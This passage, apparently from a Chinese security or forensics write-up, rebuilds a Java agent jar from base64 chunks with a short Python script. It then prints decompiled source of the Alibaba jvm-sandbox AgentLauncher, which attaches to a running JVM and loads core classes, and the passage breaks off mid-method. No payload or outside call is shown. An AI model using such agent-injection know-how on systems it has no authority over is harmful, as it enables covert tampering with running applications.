class="hljs-string">&quot;6PEEfbDM/xH7i/GGqTxhvzaVJuigheFTLlJe6VbyzAMHRAcpjw7BKD4JcxiBjEeolI5Cpqeoho7DHE44nKbZligPEj0LORjwi/kr/FWH01gzz9kyIuifpMLRIpbI37hYIrqegU7z4FST4dyLm/EYacHjWJUbz+NVntJj9Eyn+FmRZ4Q+C087TF84Ql92UZlMfH2EnoczZPu/k6DvVmlFmv8HHqigM8sfgl/hIcrwKEcrcmOmHBNPVHmx4SHZkFOUM05nVT5M/sieLPLZs0/TSwn66dLcybn7qAEAP7fIFGlC5tmAArXpeJVHi9r304wqHcCPjcW2qUg/gflfjqey9UCVR5zZ/+siz2H67QmY0UfoeZj09Sh3ssXW7aO7RQI97MNDX0WUeo4K6BsIqM+jNvkW1Ps8FPxdWkTfpyV4V9FLsKifwYtfRkT8JcXpN/Qm+i28+Xfw1z/CE/4KKn+nT9M/6Gv0T+z+Fyi+Qi/Sq/R7eo3+RKfoFfVbEHM2nWKN3ZzDHmUW9yCcv0hT+Wv8dZK/EfsLXwAD8YDmczCQb+Bwa+lz/E0YiAbaD/Hz/C2YRBzmIEaTA/o38AuY84GLbfRj/jblcg7p/B3g84hZqIhM6suK0h4uUEboQqTJ5RfxlQXdePi7+HIrIxRTtag+B6oWrefE1AUbojkpw2ygrFMQU9foLo2eTUYW69/3NHpcI7f1ZBVjik6JXGOA1YpdvX0PMrwKDVqJa6udU6dzCUqwkgT94REqKPH/OUF/3Ueaez+5s55IxRX5IzXiYsrmWciCs1EDFTsS7nT+vvicYtpDrqLVkpdeT1GqsaspKQH+OR63SuA8b1QJMApfruCTn+FsfJsB5Eri20taCfCVHhjDawlpXIqjKsNRlTiyuY1bff1AlYJCRRMqoi6f/G2c5fh8FRBJvr7xGL3WeZj+3QR6J/eSp/RAif9Ugrm57Pg+GZW1lB9f6s5a6pnsmex+jK4qn+xZJD6voLP3U1VRdiF7sEH8/7jnvbSwSMtahNV9NLNIcy9KwvlLZV5mrLh+q4f3n/q4ksxyqXrEdeJL0AItxilchtR/BQx7GerJKpqJBLYEBe5KvhKRr5rWcQ1t4FrqQi1mch3181raBZg38zqljcug2XUovH7IP4L0S6iGfwxtSPa40S47vIAX02bUjn38EuDSEVStwVAt7S0g7SRNhOWdpDyNf/I6efFkRNULoNKTNB+j12jCq3AMyxB/iuOcwRfZKeQunItE7lliiDNKjsB7aR9NKim100mobIR9OOKytCKsI26lCerHpauQNFscKWAW/8zySHy9bGf1Wfxz8ciUAAoq5Wk4/ply/DZ/vwB/s5DyLXObrewGZeVBzg==&quot;</span>,<br><span class="hljs-string">&quot;K+SCBPvFdtlhu5tgNk/TUlueR8GEsFFeUshTDvLUEZ7eNMIz99KMQp49wnNKE1zSXJbgir2UW1bIixO8pMlxyCqF81aY7jU44GvpQu6ii9HplHJ3SsYLcfy/5F8pxsrt+JNLs1VkY4eM5Y5ootJcaVrIX4PpJSmm19q1fi6YvqKQq8B02qMsKfsdHpprEXWQyrVJpZEvy4h8RSGvyoB84DyRH00hD9jI84F8taTkEa4ZRUBV9hyF9Q0BUdRBKH8cofyxhOQ3Q5vQfVChFI3zS8vsWm0mSNZZSbVMcmpZOQirypjXOooYi4EbgOxGmsc3pwoxoOLf8G+Vcc23XU2+Xla5Q77EZrMc7M13OF2WxEyLz99BIU+lFPICzFns7zpRRtMxbugs5KYCq5hHR3KhcDrCLSjpD9I8VPQo7rWDfFWg04vpjkBnQbYUOiLGYd7UXAYZry7kzSO8VT6vK+Rt8pngnrSGS0Cf+DZo+HaaxHciH9xNi/hequI9tIrvoDp+gNr4QdrCDzvc9DrbcD2YP6jctA47RSFON71uzIl4+fepNv1uhYdok5RffmTfvgRD929I8C7UYQl+U4JvOsRT4YPSePJbiA7xVSN8ayHfleC3qbl7MUerjvF9nYf5/kN0WyG/a4Tfk+AHDnHekyk3t/q2pbDVy2kyIejCuC+i5cgUjbSamhFsO6CKPygW/8h/wvsKNIl/xu5/quer6vkv9Typnq/LEwlYni71dKtntkso+fCV48p15VHR/wFQSwECFAMKAAAAAAALHUZZAAAAAAAAAAAAAAAACQAAAAAAAAAAABAA7UEAAAAATUVUQS1JTkYvUEsBAhQDCgAAAAgACh1GWUH3QvzGAAAAUwEAABQAAAAAAAAAAAAAAKSBJwAAAE1FVEEtSU5GL01BTklGRVNULk1GUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAAAAAAAAAAAQAP1BHwEAAGNvbS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAADAAAAAAAAAAAABAA/UFBAQAAY29tL2FsaWJhYmEvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAABAAAAAAAAAAAAAQAP1BawEAAGNvbS9hbGliYWJhL2p2bS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAAAAAAAAABAA/UGZAQAAY29tL2FsaWJhYmEvanZtL3NhbmRib3gvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAB4AAAAAAAAAAAAQAP1BzwEAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAQIUAwoAAAAIAAodRg==&quot;</span>,<br><span class="hljs-string">&quot;WY30FLFvBQAAzQsAADYAAAAAAAAAAAAAALSBCwIAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1NhbmRib3hDbGFzc0xvYWRlci5jbGFzc1BLAQIUAwoAAAAIAAodRlmTbgZ1HxYAAMkvAAAxAAAAAAAAAAAAAAC0gc4HAABjb20vYWxpYmFiYS9qdm0vc2FuZGJveC9hZ2VudC9BZ2VudExhdW5jaGVyLmNsYXNzUEsFBgAAAAAJAAkAeAIAADweAAAAAFChFI3zS8vsWm0mSNZZSbVMcmpZOQirypjXOooYi4EbgOxGmsc3pwoxoOLf8G+Vcc23XU2+Xla5Q77EZrMc7M13OF2WxEyLz99BIU+lFPICzFns7zpRRtMxbugs5KYCq5hHR3KhcDrCLSjpD9I8VPQo7rWDfFWg04vpjkBnQbYUOiLGYd7UXAYZry7kzSO8VT6vK+Rt8pngnrSGS0Cf+DZo+HaaxHciH9xNi/hequI9tIrvoDp+gNr4QdrCDzvc9DrbcD2YP6jctA47RSFON71uzIl4+fepNv1uhYdok5RffmTfvgRD929I8C7UYQl+U4JvOsRT4YPSePJbiA7xVSN8ayHfleC3qbl7MUerjvF9nYf5/kN0WyG/a4Tfk+AHDnHekyk3t/q2pbDVy2kyIejCuC+i5cgUjbSamhFsO6CKPygW/8h/wvsKNIl/xu5/quer6vkv9Typnq/LEwlYni71dKtntkso+fCV48p15VHR/wFQSwECFAMKAAAAAAALHUZZAAAAAAAAAAAAAAAACQAAAAAAAAAAABAA7UEAAAAATUVUQS1JTkYvUEsBAhQDCgAAAAgACh1GWUH3QvzGAAAAUwEAABQAAAAAAAAAAAAAAKSBJwAAAE1FVEEtSU5GL01BTklGRVNULk1GUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAAAAAAAAAAAQAP1BHwEAAGNvbS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAADAAAAAAAAAAAABAA/UFBAQAAY29tL2FsaWJhYmEvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAABAAAAAAAAAAAAAQAP1BawEAAGNvbS9hbGliYWJhL2p2bS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAAAAAAAAABAA/UGZAQAAY29tL2FsaWJhYmEvanZtL3NhbmRib3gvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAB4AAAAAAAAAAAAQAP1BzwEAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAQIUAwoAAAAIAAodRg==&quot;</span>]<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;agent.jar&quot;</span>, <span class="hljs-string">&quot;ab+&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        f.write(base64.b64decode(i))<br></code></pre></td></tr></table></figure><p>åç¼–è¯‘åçš„æºç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//  </span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA  </span><br><span class="hljs-comment">// (powered by FernFlower decompiler)  </span><br><span class="hljs-comment">//  </span><br><br><span class="hljs-keyword">package</span> com.alibaba.jvm.sandbox.agent;  <br><br><span class="hljs-keyword">import</span> java.io.File;  <br><span class="hljs-keyword">import</span> java.io.FileWriter;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;  <br><span class="hljs-keyword">import</span> java.net.InetSocketAddress;  <br><span class="hljs-keyword">import</span> java.util.LinkedHashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br><span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentHashMap;  <br><span class="hljs-keyword">import</span> java.util.jar.JarFile;  <br><span class="hljs-keyword">import</span> java.util.regex.Matcher;  <br><span class="hljs-keyword">import</span> java.util.regex.Pattern;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentLauncher</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_SANDBOX_HOME</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(AgentLauncher.class.getProtectionDomain().getCodeSource().getLocation().getFile())).getParentFile().getParent();  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String SANDBOX_USER_MODULE_PATH;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LAUNCH_MODE_AGENT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;agent&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LAUNCH_MODE_ATTACH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;attach&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String LAUNCH_MODE;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String RESULT_FILE_PATH;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Map&lt;String, SandboxClassLoader&gt; sandboxClassLoaderMap;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CLASS_OF_CORE_CONFIGURE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.CoreConfigure&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CLASS_OF_PROXY_CORE_SERVER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.server.ProxyCoreServer&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EMPTY_STRING</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_SANDBOX_HOME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;home&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_NAMESPACE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;namespace&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESPACE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;default&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_SERVER_IP</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;server.ip&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_IP</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;0.0.0.0&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_SERVER_PORT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;server.port&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_PORT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;0&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_TOKEN</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;token&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_TOKEN</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_PROPERTIES_FILE_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;prop&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String OS;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AgentLauncher</span><span class="hljs-params">()</span> &#123;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxCfgPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;cfg&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxModulePath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;module&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxCoreJarPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;lib&quot;</span> + File.separator + <span class="hljs-string">&quot;sandbox-core.jar&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxSpyJarPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;lib&quot;</span> + File.separator + <span class="hljs-string">&quot;sandbox-spy.jar&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxPropertiesPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">var10000</span> <span class="hljs-operator">=</span> getSandboxCfgPath(sandboxHome);  <br>        <span class="hljs-keyword">return</span> var10000 + File.separator + <span class="hljs-string">&quot;sandbox.properties&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxProviderPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;provider&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String featureString, Instrumentation inst)</span> &#123;  <br>        LAUNCH_MODE = <span class="hljs-string">&quot;agent&quot;</span>;  <br>        install(toFeatureMap(featureString), inst);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String featureString, Instrumentation inst)</span> &#123;  <br>        LAUNCH_MODE = <span class="hljs-string">&quot;attach&quot;</span>;  <br>        Map&lt;String, String&gt; featureMap = toFeatureMap(featureString);  <br>        writeAttachResult(getNamespace(featureMap), getToken(featureMap), install(featureMap, inst));  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeAttachResult</span><span class="hljs-params">(String namespace, String token, InetSocketAddress local)</span> &#123;  <br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(RESULT_FILE_PATH);  <br>        <span class="hljs-keyword">if</span> (!file.exists() || file.isFile() &amp;&amp; file.canWrite()) &#123;  <br>            <span class="hljs-keyword">try</span> &#123;  <br>                <span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(file, <span class="hljs-literal">true</span>);  <br><br>                <span class="hljs-keyword">try</span> &#123;  <br>                    fw.append(String.format(<span class="hljs-string">&quot;%s;%s;%s;%s\n&quot;</span>, namespace, token, local.getHostName(), local.getPort()));  <br>                    fw.flush();  <br>                &#125; <span class="hljs-keyword">catch</span> (Throwable var8) &#123;  <br>                    <span class="hljs-keyword">try</span> &#123;  <br>                        fw.close();  <br>                    &#125; <span class="hljs-keyword">catch</span> (Throwable var7) &#123;  <br>                        var8.addSuppressed(var7);  <br>                    &#125;  <br><br>                    <span class="hljs-keyword">throw</span> var8;  <br>                &#125;  <br><br>                fw.close();  <br>            &#125; <span class="hljs-keyword">catch</span> (IOException var9) &#123;  <br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(var9);  <br>            &#125;  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;write to result file : &quot;</span> + file + <span class="hljs-string">&quot; failed.&quot;</span>);  <br>        &#125;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> ClassLoader <span class="hljs-title function_">loadOrDefineClassLoader</span><span class="hljs-params">(String namespace, String coreJar)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        SandboxClassLoader classLoader;  <br>        <span class="hljs-keyword">if</span> (sandboxClassLoaderMap.containsKey(namespace) &amp;&amp; <span class="hljs-literal">null</span> != sandboxClassLoaderMap.get(namespace)) &#123;  <br>            classLoader = (SandboxClassLoader)sandboxClassLoaderMap.get(namespace);  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            classLoader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SandboxClassLoader</span>(namespace, coreJar);  <br>            sandboxClassLoaderMap.put(namespace, classLoader);  <br>        &#125;  <br><br>        <span class="hljs-keyword">return</span> classLoader;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uninstall</span><span class="hljs-params">(String namespace)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        <span class="hljs-type">SandboxClassLoader</span> <span class="hljs-variable">sandboxClassLoader</span> <span class="hljs-operator">=</span> (SandboxClassLoader)sandboxClassLoaderMap.get(namespace);  <br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != sandboxClassLoader) &#123;  <br>            Class&lt;?&gt; classOfProxyServer = sandboxClassLoader.loadClass(<span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.server.ProxyCoreServer&quot;</span>);  <br>            classOfProxyServer.getMethod(<span class="hljs-string">&quot;destroy&quot;</span>).invoke(classOfProxyServer.getMethod(<span class="hljs-string">&quot;getInstance&quot;</span>).invoke((Object)<span class="hljs-literal">null</span>));  <br>            sandboxClassLoader.closeIfPossible();  <br>            sandboxClassLoaderMap.remove(namespace);  <br>        &#125;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> InetSocketAddress <span class="hljs-title function_">install</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap, Instrumentation inst)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">namespace</span> <span class="hljs-operator">=</span> getNamespace(featureMap);  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">propertiesFilePath</span> <span class="hljs-operator">=</span> getPropertiesFilePath(featureMap);  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">coreFeatureString</span> <span class="hljs-operator">=</span> toFeatureString(featureMap);  <br><br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-type">String</span> <span class="hljs-variable">home</span> <span class="hljs-operator">=</span> getSandboxHome(featureMap);  <br>            inst.appendToBootstrapClassLoaderSearch(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JarFile</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(getSandboxSpyJarPath(home))));  <br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">sandboxClassLoader</span> <span class="hljs-operator">=</span> loadOrDefineClassLoader(namespace, getSandboxCoreJarPath(home));  <br>            Class&lt;?&gt; classOfConfigure = sandboxClassLoader.loadClass(<span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.CoreConfigure&quot;</span>);  <br>            <span class="hljs-type">Object</span> <span class="hljs-variable">objectOfCoreConfigure</span> <span class="hljs-operator">=</span> classOfConfigure.getMethod(<span class="hljs-string">&quot;toConfigure&quot;</span>, String.class, String.class).invoke((Object)<span class="hljs-literal">null</span>, coreFeatureString, propertiesFilePath);  <br>            Class&lt;?&gt; classOfProxyServer = sandboxClassLoader.loadClass(<span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.server.ProxyCoreServer&quot;</span>);  <br>            <span class="hljs-type">Object</span> <span class="hljs-variable">objectOfProxyServer</span> <span class="hljs-operator">=</span> classOfProxyServer.getMethod(<span class="hljs-string">&quot;getInstance&quot;</span>).invoke((Object)<span class="hljs-literal">null</span>);  <br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isBind</span> <span class="hljs-operator">=</span> (Boolean)classOfProxyServer.getMethod(<span class="hljs-string">&quot;isBind&quot;</span>).invoke(objectOfProxyServer);  <br>            <span class="hljs-keyword">if</span> (!isBind) &#123;  <br>                <span class="hljs-keyword">try</span> &#123;  <br>                    classOfProxyServer.getMethod(<span class="hljs-string">&quot;bind&quot;</span>, classOfConfigure, Instrumentation.class).invoke(objectOfProxyServer, objectOfCoreConfigure, inst);  <br>                &#125; <span class="hljs-keyword">catch</span> (Throwable var13) &#123;  <br>                    classOfProxyServer.getMethod(<span class="hljs-string">&quot;destroy&quot;</span>).invoke(objectOfProxyServer);  <br>                    <span class="hljs-keyword">throw</span> var13;  <br>                &#125;  <br>            &#125;  <br><br>            <span class="hljs-keyword">return</span> (InetSocketAddress)classOfProxyServer.getMethod(<span class="hljs-string">&quot;getLocal&quot;</span>).invoke(objectOfProxyServer);  <br>        &#125; <span class="hljs-keyword">catch</span> (Throwable var14) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;sandbox attach failed.&quot;</span>, var14);  <br>        &#125;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isNotBlankString</span><span class="hljs-params">(String string)</span> &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span> != string &amp;&amp; string.length() &gt; <span class="hljs-number">0</span> &amp;&amp; !string.matches(<span class="hljs-string">&quot;^\\s*$&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isBlankString</span><span class="hljs-params">(String string)</span> &#123;  <br>        <span class="hljs-keyword">return</span> !isNotBlankString(string);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getDefaultString</span><span class="hljs-params">(String string, String defaultString)</span> &#123;  <br>        <span class="hljs-keyword">return</span> isNotBlankString(string) ? string : defaultString;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;String, String&gt; <span class="hljs-title function_">toFeatureMap</span><span class="hljs-params">(String featureString)</span> &#123;  <br>        Map&lt;String, String&gt; featureMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>();  <br>        <span class="hljs-keyword">if</span> (isBlankString(featureString)) &#123;  <br>            <span class="hljs-keyword">return</span> featureMap;  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            String[] kvPairSegmentArray = featureString.split(<span class="hljs-string">&quot;;&quot;</span>);  <br>            <span class="hljs-keyword">if</span> (kvPairSegmentArray.length == <span class="hljs-number">0</span>) &#123;  <br>                <span class="hljs-keyword">return</span> featureMap;  <br>            &#125; <span class="hljs-keyword">else</span> &#123;  <br>                String[] var3 = kvPairSegmentArray;  <br>                <span class="hljs-type">int</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> kvPairSegmentArray.length;  <br><br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var5 &lt; var4; ++var5) &#123;  <br>                    <span class="hljs-type">String</span> <span class="hljs-variable">kvPairSegmentString</span> <span class="hljs-operator">=</span> var3[var5];  <br>                    <span class="hljs-keyword">if</span> (!isBlankString(kvPairSegmentString)) &#123;  <br>                        String[] kvSegmentArray = kvPairSegmentString.split(<span class="hljs-string">&quot;=&quot;</span>);  <br>                        <span class="hljs-keyword">if</span> (kvSegmentArray.length == <span class="hljs-number">2</span> &amp;&amp; !isBlankString(kvSegmentArray[<span class="hljs-number">0</span>]) &amp;&amp; !isBlankString(kvSegmentArray[<span class="hljs-number">1</span>])) &#123;  <br>                            featureMap.put(kvSegmentArray[<span class="hljs-number">0</span>], kvSegmentArray[<span class="hljs-number">1</span>]);  <br>                        &#125;  <br>                    &#125;  <br>                &#125;  <br><br>                <span class="hljs-keyword">return</span> featureMap;  <br>            &#125;  <br>        &#125;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getDefault</span><span class="hljs-params">(Map&lt;String, String&gt; map, String key, String defaultValue)</span> &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span> != map &amp;&amp; !map.isEmpty() ? getDefaultString((String)map.get(key), defaultValue) : defaultValue;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isWindows</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> OS.contains(<span class="hljs-string">&quot;win&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxHome</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">home</span> <span class="hljs-operator">=</span> getDefault(featureMap, <span class="hljs-string">&quot;home&quot;</span>, DEFAULT_SANDBOX_HOME);  <br>        <span class="hljs-keyword">if</span> (isWindows()) &#123;  <br>            <span class="hljs-type">Matcher</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;(?i)^[/\\\\]([a-z])[/\\\\]&quot;</span>).matcher(home);  <br>            <span class="hljs-keyword">if</span> (m.find()) &#123;  <br>                home = m.replaceFirst(<span class="hljs-string">&quot;$1:/&quot;</span>);  <br>            &#125;  <br>        &#125;  <br><br>        <span class="hljs-keyword">return</span> home;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getNamespace</span><span class="hljs-params">(Map&lt;String, 